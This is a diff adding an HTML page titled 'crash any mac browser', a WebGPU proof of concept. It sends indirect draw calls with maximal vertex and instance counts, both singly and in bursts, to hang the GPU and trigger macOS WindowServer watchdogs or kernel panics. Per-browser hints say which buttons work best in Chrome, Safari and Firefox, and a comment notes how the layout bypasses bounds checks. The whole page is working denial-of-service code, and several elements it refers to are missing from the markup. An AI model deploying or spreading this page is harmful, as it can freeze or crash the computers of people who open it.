@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>crash any mac browser</title>
+
+</head>
+<body>
+
+
+<div class="box">
+  <b>Individual variants</b> (reboot between runs if hangs):<br>
+  <button class="danger" onclick="runVariant(0xFFFFFFFF, 1, 0, 0)">vertex=MAX, inst=1</button>
+  <button class="danger" onclick="runVariant(1, 0xFFFFFFFF, 0, 0)">vertex=1, inst=MAX</button>
+  <button class="danger" onclick="runVariant(1000000, 1, 0, 0)">vertex=1M, inst=1</button>
+  <button class="danger" onclick="runVariant(1, 1000000, 0, 0)">vertex=1, inst=1M</button>
+  <button class="danger" onclick="runVariant(100000000, 1, 0, 0)">vertex=100M, inst=1</button>
+  <button class="danger" onclick="runVariant(1, 100000000, 0, 0)">vertex=1, inst=100M</button>
+</div>
+
+<div id="log">Ready. Click Init first.</div>
+
+<script>
+'use strict';
+
+let device = null;
+let pipeline = null;
+let ctx = null;
+
+const logEl = document.getElementById('log');
+function log(msg, cls) {
+    const line = document.createElement('div');
+    if (cls) line.className = cls;
+    line.textContent = new Date().toISOString().slice(11, 23) + '  ' + msg;
+    logEl.appendChild(line);
+    logEl.scrollTop = logEl.scrollHeight;
+    console.log(msg);
+}
+
+// Browser detection for instruction hints
+function detectBrowser() {
+    const ua = navigator.userAgent;
+    const bi = document.getElementById('browser_info');
+    let name = 'Unknown';
+    let hint = '';
+
+    if (ua.includes('Firefox/')) {
+        name = 'Firefox';
+        hint = 'WebGPU requires dom.webgpu.enabled=true in about:config. Also check gfx.webrender.all=true. Use Firefox Nightly for best support.';
+    } else if (ua.includes('Edg/')) {
+        name = 'Edge';
+        hint = 'Uses Dawn (same as Chrome). Behavior should match Chrome.';
+    } else if (ua.includes('Chrome/') && !ua.includes('Edg/')) {
+        name = 'Chrome';
+        hint = 'Uses Dawn. HANG button alone should trigger the panic within 60 seconds.';
+    } else if (ua.includes('Safari/') && !ua.includes('Chrome/')) {
+        name = 'Safari';
+        hint = 'Uses WebKit. HANG alone may not panic (WebKit has partial clamp). Try BURST buttons.';
+    }
+
+    bi.innerHTML = '<b>' + name + ' detected.</b> ' + hint;
+
+    if (!navigator.gpu) {
+        bi.innerHTML += '<br><b style="color:#f66">navigator.gpu is not available.</b> WebGPU not enabled in this browser.';
+    }
+}
+detectBrowser();
+
+async function init() {
+    if (device) { log('Already initialized.', 'info'); return; }
+    if (!navigator.gpu) { log('No navigator.gpu. WebGPU not available.', 'err'); return; }
+
+    const adapter = await navigator.gpu.requestAdapter();
+    if (!adapter) { log('No adapter returned. WebGPU may be disabled.', 'err'); return; }
+
+    const info = adapter.info || {};
+    log('Adapter: vendor=' + (info.vendor || '?') + ' arch=' + (info.architecture || '?') + ' device=' + (info.device || '?'), 'info');
+
+    device = await adapter.requestDevice();
+    device.addEventListener('uncapturederror', e => log('uncaptured: ' + e.error.message, 'err'));
+    device.lost.then(info => log('DEVICE LOST reason=' + info.reason + ' msg=' + info.message, 'err'));
+
+    ctx = document.getElementById('c').getContext('webgpu');
+    const format = navigator.gpu.getPreferredCanvasFormat ? navigator.gpu.getPreferredCanvasFormat() : 'bgra8unorm';
+    ctx.configure({ device: device, format: format, alphaMode: 'opaque' });
+
+    // Minimal pipeline: no vertex buffers bound, shader emits a single point.
+    // Absence of vertex buffers is important: this shape bypasses vertex-pulling bounds checks.
+    const mod = device.createShaderModule({ code: `
+        @vertex fn vs(@builtin(vertex_index) vi : u32) -> @builtin(position) vec4<f32> {
+            return vec4<f32>(0.0, 0.0, 0.0, 1.0);
+        }
+        @fragment fn fs() -> @location(0) vec4<f32> {
+            return vec4<f32>(1.0, 1.0, 1.0, 1.0);
+        }
+    `});
+
+    pipeline = device.createRenderPipeline({
+        layout: 'auto',
+        vertex: { module: mod, entryPoint: 'vs' },
+        fragment: { module: mod, entryPoint: 'fs', targets: [{ format: format }] },
+        primitive: { topology: 'point-list' },
+    });
+
+    log('WebGPU initialized. Pipeline ready. format=' + format, 'ok');
+}
+
+async function submitIndirectDraw(vertexCount, instanceCount, firstVertex, firstInstance, awaitCompletion) {
+    if (!device) { log('Init first.', 'err'); return; }
+    if (awaitCompletion === undefined) awaitCompletion = true;
+
+    const indirect = device.createBuffer({
+        size: 16,
+        usage: GPUBufferUsage.INDIRECT | GPUBufferUsage.COPY_DST,
+    });
+    const params = new Uint32Array([vertexCount, instanceCount, firstVertex, firstInstance]);
+    device.queue.writeBuffer(indirect, 0, params);
+
+    const enc = device.createCommandEncoder();
+    const pass = enc.beginRenderPass({
+        colorAttachments: [{
+            view: ctx.getCurrentTexture().createView(),
+            loadOp: 'clear',
+            storeOp: 'store',
+            clearValue: { r: 0, g: 0, b: 0, a: 1 },
+        }],
+    });
+    pass.setPipeline(pipeline);
+    pass.drawIndirect(indirect, 0);
+    pass.end();
+    device.queue.submit([enc.finish()]);
+
+    if (!awaitCompletion) return;
+
+    log('  submitted v=0x' + vertexCount.toString(16) + ' i=0x' + instanceCount.toString(16) + ', awaiting...', 'info');
+    const tStart = performance.now();
+    try {
+        await device.queue.onSubmittedWorkDone();
+        const tEnd = performance.now();
+        log('  completed in ' + (tEnd - tStart).toFixed(1) + ' ms', 'ok');
+    } catch (e) {
+        log('  submit threw: ' + e.message, 'err');
+    }
+}
+
+async function runSafe() {
+    log('Safe baseline: vertexCount=1, instanceCount=1', 'info');
+    await submitIndirectDraw(1, 1, 0, 0);
+}
+
+async function runCrash() {
+    log('HANG: vertexCount=MAX, instanceCount=MAX (Chrome: usually panics within 60s)', 'err');
+    log('If Mac freezes, do not touch anything. Either recovers or panics.', 'warn2');
+    await submitIndirectDraw(0xFFFFFFFF, 0xFFFFFFFF, 0, 0);
+}
+
+async function runVariant(v, i, fv, fi) {
+    log('Variant: vertexCount=0x' + v.toString(16) + ', instanceCount=0x' + i.toString(16), 'info');
+    await submitIndirectDraw(v, i, fv, fi);
+}
+
+// Burst mode: submit 8 varied large-values back-to-back without awaiting completion.
+// This is the pattern that triggered the Safari 12:00 WindowServer watchdog.
+async function runBurstMixed() {
+    if (!device) { log('Init first.', 'err'); return; }
+    log('BURST mixed: 8 submissions, no await between them', 'err');
+    log('If Mac freezes, do not touch anything.', 'warn2');
+    const params = [
+        [0xFFFFFFFF, 1],
+        [1, 0xFFFFFFFF],
+        [100000000, 1],
+        [1, 100000000],
+        [0xFFFFFFFF, 0xFFFFFFFF],
+        [10000000, 100],
+        [100, 10000000],
+        [0xFFFFFFFF, 0xFFFFFFFF],
+    ];
+    for (const [v, i] of params) {
+        submitIndirectDraw(v, i, 0, 0, false);
+        log('  queued v=0x' + v.toString(16) + ' i=0x' + i.toString(16), 'info');
+    }
+    log('All 8 queued. Awaiting final completion...', 'warn2');
+    try {
+        await device.queue.onSubmittedWorkDone();
+        log('Burst completed (no hang this round)', 'ok');
+    } catch (e) {
+        log('Burst threw: ' + e.message, 'err');
+    }
+}
+
+async function runBurstMax() {
+    if (!device) { log('Init first.', 'err'); return; }
+    log('BURST max: 16 submissions of UINT32_MAX/UINT32_MAX back-to-back', 'err');
+    log('If Mac freezes, do not touch anything.', 'warn2');
+    for (let n = 0; n < 16; n++) {
+        submitIndirectDraw(0xFFFFFFFF, 0xFFFFFFFF, 0, 0, false);
+    }
+    log('16 queued. Awaiting...', 'warn2');
+    try {
+        await device.queue.onSubmittedWorkDone();
+        log('Burst completed (no hang this round)', 'ok');
+    } catch (e) {
+        log('Burst threw: ' + e.message, 'err');
+    }
+}
+
+// Slow burst: one submission every 200ms, 8 total. Matches the manual-clicking
+// pattern that triggered the Safari 12:00 watchdog. Safer starting point than runBurstMax.
+async function runBurstSlow() {
+    if (!device) { log('Init first.', 'err'); return; }
+    log('BURST slow: 8 submissions at 200ms intervals (matches Safari manual-click repro)', 'err');
+    log('If Mac freezes, do not touch anything.', 'warn2');
+    const params = [
+        [0xFFFFFFFF, 1],
+        [1, 0xFFFFFFFF],
+        [100000000, 1],
+        [1, 100000000],
+        [0xFFFFFFFF, 0xFFFFFFFF],
+        [10000000, 100],
+        [100, 10000000],
+        [0xFFFFFFFF, 0xFFFFFFFF],
+    ];
+    for (const [v, i] of params) {
+        submitIndirectDraw(v, i, 0, 0, false);
+        log('  submitted v=0x' + v.toString(16) + ' i=0x' + i.toString(16), 'info');
+        await new Promise(r => setTimeout(r, 200));
+    }
+    log('All 8 submitted. Awaiting final completion...', 'warn2');
+    try {
+        await device.queue.onSubmittedWorkDone();
+        log('Slow burst completed (no hang this round)', 'ok');
+    } catch (e) {
+        log('Slow burst threw: ' + e.message, 'err');
+    }
+}
+
+document.getElementById('b_init').onclick = init;
+document.getElementById('b_safe').onclick = runSafe;
+document.getElementById('b_crash').onclick = runCrash;
+document.getElementById('b_burst_slow').onclick = runBurstSlow;
+document.getElementById('b_burst').onclick = runBurstMixed;
+document.getElementById('b_burst_max').onclick = runBurstMax;
+</script>
+
+</body>
+</html>
